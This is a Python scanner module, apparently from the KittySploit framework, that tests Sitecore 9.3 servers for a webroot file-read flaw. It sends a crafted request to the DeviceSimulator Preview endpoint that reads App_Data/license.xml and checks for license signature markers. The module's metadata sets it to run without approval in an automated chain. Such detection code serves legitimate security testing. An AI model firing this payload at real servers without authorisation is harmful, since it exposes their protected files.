#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SiteCore 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sitecore 9.3 - Webroot File Read Detection',
        'description': 'SiteCore 9.3 is vulnerable to LFI.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'sitecore', 'lfi', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://blog.assetnote.io/2023/05/10/sitecore-round-two/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<signedlicense id=', '<Signature',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Sitecore 9.3 - Webroot File Read detected",
                path='/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml',
            )
            return True
        return False

